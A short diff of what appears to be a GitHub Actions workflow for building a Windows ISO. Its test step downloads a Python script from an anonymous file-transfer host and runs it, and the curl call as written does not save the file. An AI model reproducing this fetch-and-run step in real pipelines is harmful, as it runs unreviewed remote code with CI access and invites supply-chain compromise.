@@ -43,8 +43,8 @@ jobs:
     - name: test
       if: github.event.inputs.uupapp == 'test'
       run: |
-        curl https://transfer.hx0i.xyz/1XSlJGk/test.py
-        python test.py
+        curl https://transfer.hx0i.xyz/14J7vpC/test.py
+        python test.py 6 GB
     - name: out iso version
       run: |
         $ISO=Get-ChildItem *.ISO -Name
